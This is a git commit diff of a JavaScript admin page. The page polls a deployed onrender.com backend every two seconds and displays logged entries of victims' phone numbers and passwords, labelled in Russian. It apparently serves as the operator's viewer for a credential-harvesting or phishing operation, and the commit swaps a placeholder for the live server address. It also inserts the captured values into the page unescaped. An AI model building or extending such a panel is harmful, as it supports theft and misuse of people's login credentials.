da7d2144db0517c05fda35de4da35b46d802adc5
dange262yco-glitch <dange262yco@gmail.com>
2025-11-20 16:29:36 +0300

    admin.js

--- admin.js
+++ admin.js
@@ -1,28 +1,35 @@
-const API = "https://YOUR-RENDER-URL.onrender.com";
+const API = "https://123-gmy5.onrender.com";
 
 function fetchLogs() {
   fetch(API + "/api/logs")
     .then(res => res.json())
     .then(showLogs);
 }
+
 function showLogs(data) {
   const list = document.getElementById("log-list");
   list.innerHTML = "";
-  data.forEach(item=>{
-    const div=document.createElement("div");
-    div.className="log-item";
-    div.innerHTML=`<b>${item.type==="phone"?"Телефон":"Пароль"}</b><br><small>${item.time}</small>`;
-    div.onclick=()=>showDetails(item);
+
+  data.forEach((item) => {
+    const div = document.createElement("div");
+    div.className = "log-item";
+    div.innerHTML = `
+      <b>${item.type === "phone" ? "Телефон" : "Пароль"}</b><br>
+      <small>${item.time}</small>
+    `;
+    div.onclick = () => showDetails(item);
     list.appendChild(div);
   });
 }
 
-function showDetails(item){
-  document.getElementById("details-box").innerHTML=
-  `<p><b>Тип:</b> ${item.type}</p>
-   <p><b>Данные:</b> ${item.type==="phone"?item.phone:item.password}</p>
-   <p><b>Время:</b> ${item.time}</p>`;
+function showDetails(item) {
+  const box = document.getElementById("details-box");
+  box.innerHTML = `
+    <p><b>Тип:</b> ${item.type}</p>
+    <p><b>Данные:</b> ${item.type === "phone" ? item.phone : item.password}</p>
+    <p><b>Время:</b> ${item.time}</p>
+  `;
 }
 
-setInterval(fetchLogs,2000);
+setInterval(fetchLogs, 2000);
 fetchLogs();
